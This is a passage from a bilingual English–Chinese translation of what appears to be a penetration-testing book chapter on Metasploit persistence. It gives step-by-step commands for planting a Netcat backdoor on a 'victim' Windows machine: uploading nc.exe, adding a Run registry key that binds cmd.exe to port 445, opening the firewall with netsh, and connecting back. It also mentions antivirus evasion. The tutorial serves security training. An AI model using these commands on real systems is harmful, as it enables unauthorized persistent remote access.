  zh: 如果要删除该payload，我们必须输入`resource`和在运行`persistence`命令时创建的文件的路径。我们可以在上一步中找到路径。输入`resource
    /root/.msf4/logs/persistence/PWNED-02526E037_20130513.2452/PWNED-02526E037_20130513.2452.rc`。
- en: '![Metasploit persistent backdoor](img/3589_10_38.jpg)'
  id: totrans-112
  prefs: []
  type: TYPE_IMG
  zh: '![Metasploit持久后门](img/3589_10_38.jpg)'
- en: We are going to show you another famous persistent backdoor, Netcat. We will
    upload Netcat on the victim's system through the Meterpreter session. Just as
    in the following screenshot, we will see the `nc.exe` file on our desktop; that
    file is Netcat. Now we will upload this `nc.exe` file onto the victim's `system32`
    folder. So type in `upload /root/Desktop/nc.exe C:\\windows\\system32`.
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将向您展示另一个著名的持久后门Netcat。我们将通过Meterpreter会话将Netcat上传到受害者的系统上。就像在以下截图中一样，我们将在桌面上看到`nc.exe`文件；那个文件就是Netcat。现在我们将把这个`nc.exe`文件上传到受害者的`system32`文件夹中。因此输入`upload
    /root/Desktop/nc.exe C:\\windows\\system32`。
- en: '![Metasploit persistent backdoor](img/3589_10_39.jpg)'
  id: totrans-114
  prefs: []
  type: TYPE_IMG
  zh: '![Metasploit持久后门](img/3589_10_39.jpg)'
- en: We can see that our Netcat program is successfully uploaded onto the victim's
    system. An important thing we have to do now is add Netcat to the victim's startup
    process and bind it with port 445\. In order to be able to do this, we have to
    tweak the victim's registry settings. Type in `run reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run`.
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到我们的Netcat程序已成功上传到受害者的系统。现在我们必须做的一件重要的事情是将Netcat添加到受害者的启动过程中，并将其绑定到端口445。为了能够做到这一点，我们必须调整受害者的注册表设置。输入`run
    reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run`。
- en: '![Metasploit persistent backdoor](img/3589_10_40.jpg)'
  id: totrans-116
  prefs: []
  type: TYPE_IMG
  zh: '![Metasploit持久后门](img/3589_10_40.jpg)'
- en: Running this command enumerated the startup registry key and we found that three
    services were running in the startup process. We can see the three values in the
    preceding screenshot. Now we set our Netcat service in this registry value. Type
    in `reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc
    -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'`.
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 运行此命令枚举了启动注册表键，并且我们发现启动过程中有三个服务正在运行。我们可以在前面的屏幕截图中看到这三个值。现在我们将我们的Netcat服务设置在这个注册表值中。输入`reg
    setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe
    -Ldp 445 -e cmd.exe'`。
- en: '![Metasploit persistent backdoor](img/3589_10_41.jpg)'
  id: totrans-118
  prefs: []
  type: TYPE_IMG
  zh: '![Metasploit持久后门](img/3589_10_41.jpg)'
- en: Our Netcat service is attached to the registry, so let us verify whether it
    is running properly. Type in `reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run
    -v nc`.
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的Netcat服务附加到注册表，所以让我们验证它是否正常运行。输入`reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run
    -v nc`。
- en: '![Metasploit persistent backdoor](img/3589_10_42.jpg)'
  id: totrans-120
  prefs: []
  type: TYPE_IMG
  zh: '![Metasploit持久后门](img/3589_10_42.jpg)'
- en: The next important thing we have to do is allow the Netcat service, which is
    at port number 445, through the victim's firewall. Type in `netsh firewall add
    portopening TCP 445 "Service Firewall" ENABLE ALL`.
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来我们要做的重要事情是允许Netcat服务通过受害者的防火墙的445端口。输入`netsh firewall add portopening TCP
    445 "Service Firewall" ENABLE ALL`。
- en: '![Metasploit persistent backdoor](img/3589_10_43.jpg)'
  id: totrans-122
  prefs: []
  type: TYPE_IMG
  zh: '![Metasploit持久后门](img/3589_10_43.jpg)'
- en: After executing the previous command, we see that our port seems to be open.
    So let us verify from the firewall settings whether the port is open or not. Type
    in `netsh firewall show portopening`.
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: 执行上述命令后，我们看到我们的端口似乎是打开的。因此，让我们从防火墙设置中验证端口是否打开。输入`netsh firewall show portopening`。
- en: '![Metasploit persistent backdoor](img/3589_10_44.jpg)'
  id: totrans-124
  prefs: []
  type: TYPE_IMG
  zh: '![Metasploit持久后门](img/3589_10_44.jpg)'
- en: We can clearly see in the preceding screenshot that the `445 TCP` port is enabled
    in the firewall. Now reboot the victim's system and connect the victim's system
    with Netcat. Open the terminal and type in `nc -v <targetIP > <netcat port no.>`;
    for example, here we are using `nc -v 192.168.0.107 445`. Doing this will connect
    you back to the victim's machine.
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以清楚地看到在前面的屏幕截图中，`445 TCP`端口在防火墙中是启用的。现在重新启动受害者的系统，并使用Netcat连接受害者的系统。打开终端，输入`nc
    -v <targetIP > <netcat port no.>`；例如，这里我们使用`nc -v 192.168.0.107 445`。这样做将使您重新连接到受害者的计算机。
- en: '![Metasploit persistent backdoor](img/3589_10_45.jpg)'
  id: totrans-126
  prefs: []
  type: TYPE_IMG
  zh: '![Metasploit持久后门](img/3589_10_45.jpg)'
- en: Summary
  id: totrans-127
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 摘要
- en: In this chapter we covered various techniques on how to make a backdoor executable
    for deployment on the victim's system. We learned to bind the executable files
    to legitimate programs and make the victim execute them for us to get a reverse
    connection. We also discussed different types of payloads in the Metasploit kitty
    and how they work in establishing connections with the backdoor EXE. We also worked
    on making an executable undetectable by an antivirus, and hence the user was not
    able to distinguish between a normal and a malicious file. Through these techniques,
    we were able to learn how to maintain persistent access to the system once it
    has been exploited. In the next chapter, we will discuss the final phase of post-exploitation,
    which is pivoting and network sniffing.
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们介绍了各种技术，以便在受害者系统上部署可执行的后门。我们学会了将可执行文件绑定到合法程序，并让受害者执行它们，以便我们获得反向连接。我们还讨论了Metasploit
    kitty中不同类型的有效载荷以及它们在建立与后门EXE的连接中的工作方式。我们还致力于使可执行文件无法被杀毒软件检测到，因此用户无法区分正常文件和恶意文件。通过这些技术，我们学会了如何在系统被利用后保持对系统的持久访问。在下一章中，我们将讨论后期利用的最后阶段，即枢纽和网络嗅探。
- en: References
  id: totrans-129
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 参考资料
- en: 'The following are some helpful references that shed further light on some of
    the topics covered in this chapter:'
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是一些有用的参考资料，可以进一步阐明本章涉及的一些主题：
- en: '[http://jameslovecomputers.wordpress.com/2012/12/10/metasploit-how-to-backdoor-an-exe-file-with-msfpayload/](http://jameslovecomputers.wordpress.com/2012/12/10/%E2%80%A8metasploit-how-to-backdoor-an-exe-file-with-msfpayload/)'
  id: totrans-131
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[http://jameslovecomputers.wordpress.com/2012/12/10/metasploit-how-to-backdoor-an-exe-file-with-msfpayload/](http://jameslovecomputers.wordpress.com/2012/12/10/%E2%80%A8metasploit-how-to-backdoor-an-exe-file-with-msfpayload/)'
- en: '[http://pentestlab.wordpress.com/2012/04/16/creating-an-undetectable-backdoor/](http://pentestlab.wordpress.com/2012/04/16/creating-an-undetectable-backdoor/)'
  id: totrans-132
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[http://pentestlab.wordpress.com/2012/04/16/creating-an-undetectable-backdoor/](http://pentestlab.wordpress.com/2012/04/16/creating-an-undetectable-backdoor/)'
- en: '[http://www.securitylabs.in/2011/12/easy-bypass-av-and-firewall.html](http://www.securitylabs.in/2011/12/easy-bypass-av-and-firewall.html)'
  id: totrans-133
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[http://www.securitylabs.in/2011/12/easy-bypass-av-and-firewall.html](http://www.securitylabs.in/2011/12/easy-bypass-av-and-firewall.html)'
- en: '[http://www.offensive-security.com/metasploit-unleashed/Interacting_With_Metsvc](http://www.offensive-security.com/metasploit-unleashed/Interacting_With_Metsvc)'
  id: totrans-134
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[http://www.offensive-security.com/metasploit-unleashed/Interacting_With_Metsvc](http://www.offensive-security.com/metasploit-unleashed/Interacting_With_Metsvc)'
- en: '[http://www.offensive-security.com/metasploit-unleashed/Netcat_Backdoor](http://www.offensive-security.com/metasploit-unleashed/%E2%80%A8Netcat_Backdoor)'
  id: totrans-135
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[http://www.offensive-security.com/metasploit-unleashed/Netcat_Backdoor](http://www.offensive-security.com/metasploit-unleashed/%E2%80%A8Netcat_Backdoor)'
- en: '[http://en.wikipedia.org/wiki/Backdoor_(computing)](http://en.wikipedia.org/wiki/Backdoor_(computing))'
  id: totrans-136
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[http://en.wikipedia.org/wiki/Backdoor_(computing)](http://en.wikipedia.org/wiki/Backdoor_(computing))'
- en: '[http://www.f-secure.com/v-descs/backdoor.shtml](http://www.f-secure.com/v-descs/backdoor.shtml)'
  id: totrans-137
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[http://www.f-secure.com/v-descs/backdoor.shtml](http://www.f-secure.com/v-descs/backdoor.shtml)'
- en: '[http://feky.bizhat.com/tuts/backdoor.htm](http://feky.bizhat.com/tuts/backdoor.htm)'
  id: totrans-138
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[http://feky.bizhat.com/tuts/backdoor.htm](http://feky.bizhat.com/tuts/backdoor.htm)'
- en: '[http://www.offensive-security.com/metasploit-unleashed/Msfpayload](http://www.offensive-security.com/metasploit-unleashed/Msfpayload)'
  id: totrans-139
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[http://www.offensive-security.com/metasploit-unleashed/Msfpayload](http://www.offensive-security.com/metasploit-unleashed/Msfpayload)'
- en: '[http://www.offensive-security.com/metasploit-unleashed/Msfencode](http://www.offensive-security.com/metasploit-unleashed/Msfencode)'
  id: totrans-140
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[http://www.offensive-security.com/metasploit-unleashed/Msfencode](http://www.offensive-security.com/metasploit-unleashed/Msfencode)'
- en: '[http://www.offensive-security.com/metasploit-unleashed/Msfvenom](http://www.offensive-security.com/metasploit-unleashed/Msfvenom)'
  id: totrans-141
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[http://www.offensive-security.com/metasploit-unleashed/Msfvenom](http://www.offensive-security.com/metasploit-unleashed/Msfvenom)'
